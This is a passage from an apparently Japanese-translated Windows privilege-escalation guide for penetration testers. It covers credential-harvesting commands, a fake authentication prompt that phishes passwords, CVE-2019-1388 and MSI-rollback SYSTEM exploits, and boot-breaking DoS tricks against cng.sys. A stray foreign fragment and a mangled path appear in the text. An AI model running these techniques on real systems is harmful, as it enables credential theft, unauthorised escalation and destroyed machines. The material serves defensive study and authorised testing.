C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使用して、以下のファイルを検索することもできます: _post/windows/gather/enum_unattend_

例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Pasword

以前は、Group Policy Preferences (GPP) を介して、複数のマシンにカスタムのローカル administrator アカウントを展開できる機能がありました。しかし、この方法には重大な security flaw がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPOs) は、すべての domain user からアクセス可能でした。第二に、公開されているデフォルトキーを使用して AES256 で暗号化された、これらの GPP 内の password は、認証済みのすべての user が復号できました。これにより、user が elevated privileges を取得できる可能性があり、重大な risk が生じていました。

この risk を軽減するため、空でない `"cpassword"` field を含む、ローカルに cached された GPP file を検索する function が開発されました。このような file が見つかると、function は password を復号し、custom PowerShell object を返します。この object には、GPP に関する詳細と file の location が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、以下の file を検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を尋ねる

ユーザーが知っている可能性があると思う場合は、**ユーザーに自身の認証情報、または別のユーザーの認証情報を入力するよう常に求めることができます**（ただし、クライアントに直接**認証情報**を**尋ねる**のは非常に**リスクが高い**ことに注意してください）。
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または **Base64** で含まれていた既知のファイルிழமை
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索します：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の Credentials

Credentials がないか確認するため、Bin もチェックしてください

複数のプログラムによって保存された **passwords を recover** するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**Credentials を含むその他の可能性があるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome または Firefox** のパスワードが保存されている dbs を確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

ブラウザーからパスワードを抽出する Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる言語で作られた software components 間の**intercommunication**を可能にします。各 COM component は **class ID (CLSID)** によって**識別**され、各 component は 1 つ以上の interfaces を介して functionality を公開します。これらは interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、それぞれ registry の **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作成されます = **HKEY\CLASSES\ROOT.**

この registry の CLSIDs 内には、child registry **InProcServer32** があります。これには **DLL** を指す **default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) となる **ThreadingModel** という value が含まれています。

![Browsers History - COM DLL Overwriting: この registry の CLSIDs 内には child registry InProcServer32 があり、DLL を指す default value と value...](<../../images/image (729).png>)

基本的に、実行される予定の **DLL のいずれかを overwrite** でき、その DLL が別の user によって実行される場合、**privileges を escalate** できます。

攻撃者が COM Hijacking を persistence mechanism として使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **files と registry 内の Generic Password search**

**file contents を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索する Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) このページで言及されている、パスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するもう1つの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM として実行されているプロセスが、完全なアクセス権で新しいプロセス**（`OpenProcess()`）を**開く**とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限の新しいプロセス**（`CreateProcess()`）も**作成**します。\
その後、**低い権限のプロセスに対する完全なアクセス権**を持っていれば、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を inject**できます。\
**この脆弱性の検出および悪用方法**の詳細については、[この例](leaked-handle-exploitation.md)を参照してください。\
**異なる権限レベル（完全なアクセス権だけではありません）で継承された、プロセスおよびスレッドのより多くのオープンハンドルをテストおよび abuse する方法**については、[**こちらの別の post**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)でより詳しく説明されています。

## Named Pipe Client Impersonation

**pipes**と呼ばれる共有メモリセグメントにより、プロセス間の通信およびデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、異なるネットワーク上にある場合でも、無関係なプロセス間でデータを共有できます。これは **named pipe server** と **named pipe client** という役割を持つ、client/server アーキテクチャに似ています。

**client** が pipe を通じてデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っている場合、**client** の**アイデンティティを impersonate**できます。偽装可能な pipe を介して通信する**特権プロセス**を特定できれば、そのプロセスが自分で確立した pipe とやり取りした時点で、そのアイデンティティを採用して**より高い権限を取得**できる可能性があります。この攻撃の実行手順については、[**こちら**](named-pipe-client-impersonation.md)および[**こちら**](#from-high-integrity-to-system)のガイドを参照してください。

また、次の tool を使用すると、**burp のような tool で named pipe communication を intercept**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。**この tool を使用すると、すべての pipe を list および確認して privescs を見つける**ことができます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service（TapiSrv）は server mode で `\\pipe\\tapsrv`（MS-TRP）を公開します。remote authenticated client は、mailslot-based async event path を abuse して、`ClientAttach` を `NETWORK SERVICE` によって writable な既存ファイルに対する任意の **4-byte write** に変換し、その後 Telephony admin 権限を取得して、service として任意の DLL を load できます。全体の flow は次のとおりです。

- `pszDomainUser` に writable な既存パスを設定して `ClientAttach` → service は `CreateFileW(..., OPEN_EXISTING)` を介してそのパスを開き、async event writes に使用します。
- 各 event は、`Initialize` から attacker-controlled な `InitContext` をその handle に write します。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を register し、`TRequestMakeCall`（`Req_Func 121`）を trigger し、`GetAsyncEvents`（`Req_Func 0`）で fetch してから、unregister/shutdown して deterministic な write を繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を call すると、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を execute できます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で stuff を execute できる File Extensions

**[https://filesec.io/](https://filesec.io/)** の page を確認してください。

### Markdown renderers を介した Protocol handler / ShellExecute abuse

`ShellExecuteExW` に forward された clickable な Markdown links は、危険な URI handlers（`file:`、`ms-appinstaller:`、または登録済みの scheme）を trigger し、current user として attacker-controlled files を execute する可能性があります。以下を参照してください。

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **password の Command Lines を Monitoring**

user として shell を取得した場合、**command line に credentials を渡して** scheduled tasks やその他の processes が execute されている可能性があります。以下の script は、2 秒ごとに process command lines を capture し、current state と previous state を比較して、differences があれば output します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを窃取する

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

コンソールまたは RDP 経由でグラフィカルインターフェースにアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや、"NT\AUTHORITY SYSTEM" などのプロセスを実行できます。

これにより、同じ脆弱性を利用して権限を昇格し、同時に UAC をバイパスできます。さらに、何もインストールする必要がなく、プロセス中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムには、次のようなものがあります。
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性をexploitするには、以下の手順を実行する必要があります：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
リポジトリ内の以下の GitHub リポジトリに、必要なすべてのファイルと情報があります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への移行 / UAC Bypass

**Integrity Levels**について学ぶために、こちらを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses**について学ぶために、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている technique で、exploit code は[**こちらで入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この attack は基本的に、Windows Installer の rollback feature を悪用し、uninstallation process 中に正規の files を malicious files に置き換えます。そのため、attacker は**malicious MSI installer**を作成する必要があります。これは `C:\Config.Msi` folder を hijack するために使用されます。この folder は後で、他の MSI packages の uninstallation 中に Windows Installer が rollback files を保存するために使用します。rollback files には malicious payload が含まれるよう変更されます。

この technique の概要は次のとおりです:

1. **Stage 1 – Hijack の準備 (`C:\Config.Msi` を空にする)**

- Step 1: MSI を install
- writable folder (`TARGETDIR`) に harmless file (例: `dummy.txt`) を install する `.msi` を作成します。
- installer を **"UAC Compliant"** として mark し、**non-admin user**でも実行できるようにします。
- install 後も file への **handle**を open のままにします。

- Step 2: Uninstall の開始
- 同じ `.msi` を uninstall します。
- uninstall process は files を `C:\Config.Msi` に移動し、`.rbf` files (rollback backups) に rename し始めます。
- `GetFinalPathNameByHandle` を使用して、open されている file handle を**poll**し、file が `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には**custom uninstall action (`SyncOnRbfWritten`)**が含まれており、次の処理を行います:
- `.rbf` が write されたことを signal します。
- その後、uninstall を続行する前に別の event を wait します。

- Step 4: `.rbf` の削除を block
- signal を受信したら、`FILE_SHARE_DELETE` なしで **`.rbf` file を open**します — これにより**削除されなくなります**。
- 次に signal を返し、uninstall を完了させます。
- Windows Installer は `.rbf` の削除に失敗します。すべての contents を削除できないため、`C:\Config.Msi` は remove されません。

- Step 5: `.rbf` を手動で delete
- 攻撃者であるあなたが `.rbf` file を手動で delete します。
- これで **`C:\Config.Msi` は空**になり、hijack の準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability**を trigger して `C:\Config.Msi` を delete します。

2. **Stage 2 – Rollback Scripts を Malicious なものに置換**

- Step 6: Weak ACLs を設定して `C:\Config.Msi` を再作成
- `C:\Config.Msi` folder を自分で再作成します。
- **weak DACLs** (例: Everyone:F) を設定し、`WRITE_DAC` を持つ **handle を open のまま**にします。

- Step 7: 別の Install を実行
- 次の設定で `.msi` を install します:
- `TARGETDIR`: Writable location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、`.rbs` と `.rbf` を read する **rollback**を再度 trigger するために使用します。

- Step 8: `.rbs` を monitor
- `ReadDirectoryChangesW` を使用して `C:\Config.Msi` を monitor し、新しい `.rbs` が出現するまで待ちます。
- その filename を capture します。

- Step 9: Rollback 前に Sync
- `.msi` には**custom install action (`SyncBeforeRollback`)**が含まれており、次の処理を行います:
- `.rbs` が create されたときに event を signal します。
- その後、続行する前に wait します。

- Step 10: Weak ACL を再適用
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に**strong ACLs を再適用**します。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、再び **weak ACLs を再適用**できます。

> ACLs は**handle open 時にのみ enforce される**ため、folder に write を続けることができます。

- Step 11: Fake `.rbs` と `.rbf` を drop
- `.rbs` file を、Windows に次の動作を指示する**fake rollback script**で overwrite します:
- `.rbf` file (malicious DLL) を **privileged location** (例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) に restore する。
- **malicious SYSTEM-level payload DLL**を含む fake `.rbf` を drop します。

- Step 12: Rollback を trigger
- sync event を signal し、installer を resume させます。
- **type 19 custom action (`ErrorOut`)**は、既知の point で install を**意図的に fail**させるよう設定されています。
- これにより **rollback が開始**されます。

- Step 13: SYSTEM が DLL を install
- Windows Installer は:
- malicious `.rbs` を read します。
- `.rbf` DLL を target location に copy します。
- これで、**SYSTEM が load する path に malicious DLL**を配置できました。

- Final Step: SYSTEM Code を execute
- DLL hijack を行った DLL を load する、trusted **auto-elevated binary** (例: `osk.exe`) を実行します。
- **Boom**: code が **SYSTEM として**実行されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主な MSI rollback technique (前述のもの)では、**entire folder** (例: `C:\Config.Msi`) を delete できることが前提です。しかし、vulnerability が **arbitrary file deletion**しか許可しない場合はどうでしょうか？

**NTFS internals**を exploit できます: すべての folder には、次の名前の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream には、フォルダーの **index metadata** が保存されています。

したがって、フォルダーの **`::$INDEX_ALLOCATION` stream** を **delete** すると、NTFS はファイルシステムから **フォルダー全体を削除**します。

これは、次のような標準の file deletion API を使用して実行できます：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
プリミティブが任意のファイルやフォルダーを削除できなくても、攻撃者が制御するフォルダーの**内容を削除できる**場合はどうでしょうか？

1. Step 1: 囮のフォルダーとファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により**実行が一時停止します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御が callback に渡されます。

4. Step 4: oplock callback 内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を壊さずに `folder1` を空にできます。
- `file1.txt` を直接削除しないでください。oplock が早期に解放されてしまいます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` に **symlink** を作成します。
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダーのメタデータを保存する NTFS 内部ストリームを対象とします—これを削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM process は処理を続行し、`file1.txt` の削除を試みます。
- しかし、junction + symlink により、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から Permanent DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダーを作成できる** primitive を Exploit します。

**重要な Windows driver** の名前を持つ**フォルダー**（ファイルではない）を作成します。例：
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **folder として事前に作成**すると、Windows は boot 時に実際の driver を load できなくなります。
- その後、Windows は boot 中に `cng.sys` を load しようとします。
- folder を検出すると、**実際の driver の解決に失敗**し、**crash または boot の停止**が発生します。
- **fallback はなく**、外部からの介入（例：boot repair または disk access）なしでは**復旧できません**。

### privileged log/backup paths + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み取ったパスに logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスを redirect し、**SeCreateSymbolicLinkPrivilege がなくても** privileged write を arbitrary overwrite に変換できます。<sup>[[15]](#references)</sup>

**Requirements**
- target path を保存する config が attacker によって writable であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む privileged operation（log、export、report）。

**Example chain**
1. config を読み取り、privileged log destination を復元します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしでパスを redirect します：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例: 管理者が「テストSMSを送信」を実行する）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を調査して（hex/PE parser）、破損を確認します。再起動すると、Windowsが改ざんされたドライバーのパスを読み込むため、**boot loop DoS** が発生します。これは、特権サービスが書き込み用に開く保護対象ファイル全般に応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、そちらが先に試行される可能性があります。そのため、破損データの信頼できるDoS sinkになります。



## **High IntegrityからSystemへ**

### **新しいサービス**

すでにHigh Integrity process上で実行している場合、**SYSTEMへのpath**は、**新しいサービスを作成して実行する**だけで簡単に確保できます。
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する際は、それが有効な service であること、または binary が必要な actions を十分速く実行することを確認してください。有効な service でない場合、20s で kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を enable** し、_**.msi**_ wrapper を使用して reverse shell を **install** できます。\
[関連する registry keys と _.msi_ package の install 方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### SeDebug + SeImpersonate から Full Token privileges へ

これらの token privileges を持っている場合（おそらく、すでに High Integrity process 内で見つかります）、SeDebug privilege により、**ほぼすべての process**（protected processes を除く）を **open** し、その process の **token を copy** して、**その token を使用した arbitrary process を create** できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として実行されている process を選択**します（_すべての token privileges を持たない SYSTEM process も見つかります_）。\
**提案した technique を実行する code の** [**example はこちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation を行う際に使用されます。この technique は、**pipe を create し、その pipe に write するための service を create/abuse する**というものです。その後、`SeImpersonate` privilege を使用して pipe を create した **server** は、pipe client（service）の **token を impersonate** でき、SYSTEM privileges を取得できます。\
name pipes について [**詳しく知りたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使用して [**high integrity から System に移行する方法の example を読みたい場合はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行されている **process** によって **loaded** される **dll を hijack** できれば、その permissions で arbitrary code を execute できます。そのため Dll Hijacking はこの種の privilege escalation にも有用です。さらに、High Integrity process からであれば、dll の load に使用される folders に対する **write permissions** があるため、はるかに **easy to achieve** です。\
**Dll hijacking について** [**詳しくはこちら**](dll-hijacking/index.html)**。**

### **Administrator または Network Service から System へ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE または NETWORK SERVICE から full privs へ

**こちらを読んでください:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## その他の help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための Best tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
